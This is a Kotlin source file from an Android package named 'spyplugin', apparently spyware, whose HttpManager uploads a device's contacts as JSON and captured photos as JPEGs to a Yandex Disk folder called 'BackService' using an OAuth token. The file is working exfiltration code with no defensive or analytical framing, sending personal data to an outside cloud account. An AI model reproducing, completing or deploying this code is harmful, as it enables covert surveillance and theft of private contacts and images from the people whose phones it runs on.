package com.example.spyplugin

import android.graphics.Bitmap
import android.util.Log
import com.google.gson.GsonBuilder
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.collections.get

object HttpManager {
    private const val YANDEX_DISK_API = "https://cloud-api.yandex.net/v1/disk/resources/upload"
    private const val ACCESS_TOKEN = ""
    private val gson = GsonBuilder().setPrettyPrinting().create()
    suspend fun saveContactsToYandexDisk(request: ContactsRequest): Boolean {
        return withContext(Dispatchers.IO) {
            try {

                val jsonString = gson.toJson(request)
                Log.d("YANDEX_DISK", "JSON подготовлен, размер: ${jsonString.length} символов")

                // Получение ссылки для загрузки от Яндекс Диска
                val uploadUrl = getYandexUploadUrl() ?: return@withContext false

                // Загрузка на Яндекс Диск
                val uploadSuccess = uploadJsonToYandex(uploadUrl, jsonString)

                if (uploadSuccess) {
                    Log.d("YANDEX_DISK", "Файл с контактами успешно загружен на Яндекс.Диск")
                }

                uploadSuccess

            } catch (e: Exception) {
                Log.e("YANDEX_DISK", "Ошибка при сохранении на Яндекс.Диск: ${e.message}")
                false
            }
        }
    }


    private fun getYandexUploadUrl(): String? {
        var connection: HttpURLConnection? = null
        try {
            val timestamp = System.currentTimeMillis()
            val fileName = "contacts_$timestamp.json"

            val diskPath = URLEncoder.encode("/BackService/$fileName", "UTF-8")

            val urlString = "$YANDEX_DISK_API?path=$diskPath&overwrite=true"
            val url = URL(urlString)

            connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.setRequestProperty("Authorization", "OAuth $ACCESS_TOKEN")
            connection.connectTimeout = 30000
            connection.readTimeout = 30000

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = reader.readText()
                reader.close()

                // Извлечение href
                val jsonResponse = gson.fromJson(response, Map::class.java)
                val uploadHref = jsonResponse["href"] as String

                Log.d("YANDEX_DISK", "Ссылка для загрузки получена")
                return uploadHref
            } else {
                val errorReader = BufferedReader(InputStreamReader(connection.errorStream))
                val errorResponse = errorReader.readText()
                errorReader.close()
                Log.e("YANDEX_DISK", "Ошибка получения URL для загрузки. Код: $responseCode, Ответ: $errorResponse")
                return null
            }
        } catch (e: Exception) {
            Log.e("YANDEX_DISK", "Ошибка при запросе URL для загрузки: ${e.message}")
            return null
        } finally {
            connection?.disconnect()
        }
    }

    private fun getYandexUploadUrl(diskPath: String): String? {
        var connection: HttpURLConnection? = null
        try {
            val diskPath = URLEncoder.encode(diskPath, "UTF-8")

            val urlString = "$YANDEX_DISK_API?path=$diskPath&overwrite=true"
            val url = URL(urlString)

            connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.setRequestProperty("Authorization", "OAuth $ACCESS_TOKEN")
            connection.connectTimeout = 30000
            connection.readTimeout = 30000

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = reader.readText()
                reader.close()

                // Извлечение href
                val jsonResponse = gson.fromJson(response, Map::class.java)
                val uploadHref = jsonResponse["href"] as String

                Log.d("YANDEX_DISK", "Ссылка для загрузки получена")
                return uploadHref
            } else {
                val errorReader = BufferedReader(InputStreamReader(connection.errorStream))
                val errorResponse = errorReader.readText()
                errorReader.close()
                Log.e("YANDEX_DISK", "Ошибка получения URL для загрузки. Код: $responseCode, Ответ: $errorResponse")
                return null
            }
        } catch (e: Exception) {
            Log.e("YANDEX_DISK", "Ошибка при запросе URL для загрузки: ${e.message}")
            return null
        } finally {
            connection?.disconnect()
        }
    }

    private fun uploadJsonToYandex(uploadUrl: String, jsonString: String): Boolean {
        var connection: HttpURLConnection? = null
        try {
            val url = URL(uploadUrl)
            connection = url.openConnection() as HttpURLConnection

            connection.requestMethod = "PUT"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            connection.connectTimeout = 30000
            connection.readTimeout = 30000

            val outputStream: OutputStream = connection.outputStream
            outputStream.write(jsonString.toByteArray(Charsets.UTF_8))
            outputStream.flush()
            outputStream.close()

            val responseCode = connection.responseCode

            if (responseCode == 201 || responseCode == 200) {
                Log.d("YANDEX_DISK", "Файл успешно загружен, код ответа: $responseCode")
                return true
            } else {
                val errorStream = if (responseCode >= 400) connection.errorStream else connection.inputStream
                val reader = BufferedReader(InputStreamReader(errorStream))
                val errorResponse = reader.readText()
                reader.close()
                Log.e("YANDEX_DISK", "Ошибка загрузки файла. Код: $responseCode, Ответ: $errorResponse")
                return false
            }
        } catch (e: Exception) {
            Log.e("YANDEX_DISK", "Ошибка при загрузке файла: ${e.message}")
            return false
        } finally {
            connection?.disconnect()
        }
    }

    fun uploadPhoto(bitmap: Bitmap, diskPath: String): Boolean {

        val uploadUrl = getYandexUploadUrl(diskPath) ?: return false

        Log.d("HttpManager", uploadUrl)

        val stream = java.io.ByteArrayOutputStream()

        bitmap.compress(
            Bitmap.CompressFormat.JPEG,
            80,
            stream
        )

        val bytes = stream.toByteArray()

        return uploadBinary(uploadUrl, bytes)
    }

    private fun uploadBinary(uploadUrl: String, data: ByteArray): Boolean {

        var connection: HttpURLConnection? = null

        return try {

            val url = URL(uploadUrl)
            connection = url.openConnection() as HttpURLConnection

            connection.requestMethod = "PUT"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/octet-stream")

            val os = connection.outputStream
            os.write(data)
            os.flush()
            os.close()

            val responseCode = connection.responseCode

            responseCode == 201 || responseCode == 200

        } catch (e: Exception) {

            Log.e("YANDEX_DISK", "Ошибка загрузки файла: ${e.message}")
            false

        } finally {
            connection?.disconnect()
        }
    }
}